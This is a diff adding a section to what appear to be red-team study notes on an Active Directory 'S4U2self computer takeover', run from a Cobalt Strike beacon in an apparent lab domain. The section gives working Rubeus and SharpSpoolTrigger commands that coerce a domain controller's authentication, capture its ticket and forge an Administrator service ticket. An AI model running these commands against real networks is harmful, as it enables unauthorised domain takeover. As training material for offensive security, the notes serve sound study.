@@ -98,3 +98,19 @@ service name substitution:
                 /ticket is the TGT for the principal
                 /impersonateuser is the user we want to impersonate
             
+S4U2self computer takeover:
+    technique for going after a computer directly rather than a user (e.g. if we have no user's TGT available to use)
+    we can force a computer to authenticate to another computer in several ways (i.e. SpoolSample, PetitPotam)
+    so we can begin monitoring for tickets:
+        beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:5 /nowrap
+    and then force one computer to authenticate to another:
+        beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe lon-dc-1 lon-ws-1
+            NOTE: this is using https://github.com/cube0x0/SharpSystemTriggers
+    we will then capture the TGT via rubeus 
+    then to compromise the computer once we have its TGT is to use S4U2self:
+        beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:cifs/lon-dc-1 /ticket:[ticket] /nowrap
+            where...
+                /impersonateuser is the user we want to impersonate
+                /self tells rubeus not to submit S4U2proxy
+                /altservice is the SPN we want substituted into the service ticket
+                /ticket is the TGT
